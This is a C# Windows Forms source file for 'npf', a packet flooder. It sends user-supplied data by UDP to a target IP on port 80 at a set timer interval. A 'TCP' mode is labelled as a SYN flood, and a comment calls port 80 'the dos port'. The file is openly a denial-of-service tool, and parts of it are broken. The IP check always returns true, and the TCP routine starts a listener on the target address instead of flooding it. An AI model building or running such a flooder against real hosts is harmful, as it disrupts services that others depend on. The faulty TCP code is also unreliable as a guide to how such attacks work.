using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace npf
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void textBox1_TextChanged(object sender, EventArgs e) // i really dont need this but for some reason the program breaks if i remove it so i have to keep it here
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string intervall = intervalTxt.Text;
            int value;
            if (int.TryParse(intervall, out value))
            {
                bool internetcon = CheckForInternetConnection(); // this checks the internet connection
                if (internetcon)
                {
                    floodTimer.Interval = Int16.Parse(intervalTxt.Text);
                    if (floodTimer.Enabled)
                    {
                        MessageBox.Show("Flooding is still in progress.");
                    }
                    else
                    {
                        MessageBox.Show("Flooding started.");
                        floodTimer.Start();
                    }
                }
                else
                {
                    MessageBox.Show("You do not have an internet connection, reconnect and try again.");
                    System.Windows.Forms.Application.Exit();
                }
            }
            else
            {
                MessageBox.Show("Incorrect interval. Please enter an integer.");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (floodTimer.Enabled)
            {
                MessageBox.Show("Flooding stopped.");
                floodTimer.Stop();
            }
            else
            {
                MessageBox.Show("Flooding hasn't started yet, therefore nothing has been stopped.");
            }
        }
        public static bool CheckForInternetConnection() // this checks for internet
        {
            try
            {
                using (var CheckClient = new WebClient())
                using (CheckClient.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        private void floodTimer_Tick(object sender, EventArgs e)
        {
            if (ProtocolBox.CheckedItems.Count != 0)
            {
                //looped through all checked items and show results.
                string s = "";
                for (int x = 0; x < ProtocolBox.CheckedItems.Count; x++)
                {
                    s = ProtocolBox.CheckedItems[x].ToString();
                }
                if (s == "UDP")
                {
                    floodUdp();
                }
                else if (s == "TCP")
                {
                    floodSyn();
                }
                else
                {
                    MessageBox.Show("Please make sure you checked at least 1 box.");
                    floodTimer.Stop();
                }
            }
        }
        private void floodUdp() // all the upcoming code happens every second or so
        {
            string ipaddr = IPText.Text;
            var checkedudp = CheckIP(ipaddr);
            UdpClient client = new UdpClient(); // this is just the udp client, nothing interesting
            if (checkedudp)
            {
                try
                {
                    client.Connect(ipaddr, 80); // this is where the fun starts 
                    byte[] sendBytes = Encoding.ASCII.GetBytes(DataText.Text);
                    client.Send(sendBytes, sendBytes.Length); // this actually sends the packet
                    client.AllowNatTraversal(true);
                    client.DontFragment = true;
                }
                catch
                {
                    MessageBox.Show("There was an error with npf. Ensure that you have an internet connection and that all the data is entered correctly.");
                    floodTimer.Stop();
                }
            }
            else
            {
                MessageBox.Show("The IP address is invalid or cannot be pinged at this time. Please enter a valid IP address");
                floodTimer.Stop();
            }
        }

        public static bool CheckIP(string nameOrAddress) // this used to ping ip but it didnt work so i have to keep it at return true;
        {
            return true;
        }

        private void floodSyn() // just floodudp but for tcp
        {
            string ipaddr = IPText.Text;
            var checkip = CheckIP(ipaddr);
            Int32 port = 80; // this is the dos port
            IPAddress localAddr = IPAddress.Parse(ipaddr);
            if (checkip)
            {
                try
                {
                    using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP))
                    {
                        var server = new TcpListener(localAddr, port);
                        server.Start();
                        TcpClient client = server.AcceptTcpClient();

                        NetworkStream stream = client.GetStream();
                        String data = DataText.Text;
                        byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);
                        stream.Write(msg, 0, msg.Length);
                    }
                }
                catch
                {
                    MessageBox.Show("There was an error with npf. Ensure that you have an internet connection and that all the data is entered correctly.");
                    floodTimer.Stop();
                }
            }
            else
            {
                MessageBox.Show("The IP address is invalid or cannot be pinged at this time. Please enter a valid IP address.");
                floodTimer.Stop();
            }
        }
    }
}